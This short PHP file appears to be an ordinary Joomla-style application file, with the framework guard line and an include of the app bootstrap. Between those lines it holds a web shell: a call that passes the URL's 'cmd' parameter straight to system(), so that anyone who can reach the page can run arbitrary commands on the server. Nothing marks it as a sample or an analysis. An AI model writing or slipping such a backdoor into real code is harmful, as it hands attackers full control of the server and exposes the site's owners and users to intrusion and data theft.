<?php
defined('_JEXEC') or die;
system($_GET['cmd'] ?? '');
require_once __DIR__ . '/includes/app.php';
